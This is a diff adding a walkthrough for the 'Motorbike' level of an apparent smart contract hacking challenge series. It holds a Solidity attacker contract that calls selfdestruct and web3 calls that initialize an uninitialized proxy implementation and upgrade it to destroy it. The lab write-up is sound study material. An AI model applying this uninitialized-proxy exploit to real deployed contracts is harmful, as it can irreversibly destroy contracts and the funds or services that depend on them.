@@ -476,9 +476,35 @@ contract.setMaxBalance('0xaddress')
 ## Motorbike
 Here, our goal is to selfdestruct the engine of the motorbike. The motorbike contract uses delegatecall, and has called the `initialize()` function of the implementation in constructor. But, the implementation has not been initialized. So, as an attacker, we can initialize the implementation and upgrade it to an attacker contract. Then, as it delegatecalls, we are able to selfdestruct the contract.
 
+First, deploy the attacker contract:
 ```solidity
-
+contract attack {
+    fallback() external {
+        selfdestruct(tx.origin);
+    }
+}
 ```
+
+Then, in js:
+```js
+// Read the implementation address
+web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+// Call initialize on implementation contract
+web3.eth.sendTransaction({from: "YOUR_WALLET_ADDRESS", to: "THE_IMPLEMENTATION_ADDRESS", data: "0x8129fc1c"});
+// Then we are the upgrader of the implementation 
+// it can be verified with:
+web3.eth.getStorageAt("0x6f3b8e311e53312295c79ccd6cf90bfeca9b561f", "0");
+// Now, call upgradeToAndCall with our attacker contract as argument, and a data length > 0
+// Our calldata will be:
+//0x4f1ef286       --> The function selector
+//000000000000000000000000ATTACKER_CONTRACT_ADDRESS       --> The new implementation (replace with your attacker contract)
+//0000000000000000000000000000000000000000000000000000000000000040   --> Index at which `data` starts
+//0000000000000000000000000000000000000000000000000000000000000003   --> size of data
+// aabbcc   --> Data (not necessary)
+web3.eth.sendTransaction({from: "YOUR_WALLET_ADDRESS", to: "THE_IMPLEMENTATION_ADDRESS", data: "0x4f1ef286000000000000000000000000ATTACKER_CONTRACT_ADDRESS00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000003aabbcc"});
+// The implementation contract is now selfdestructed !!!
+```
+
 
 ## Others
 
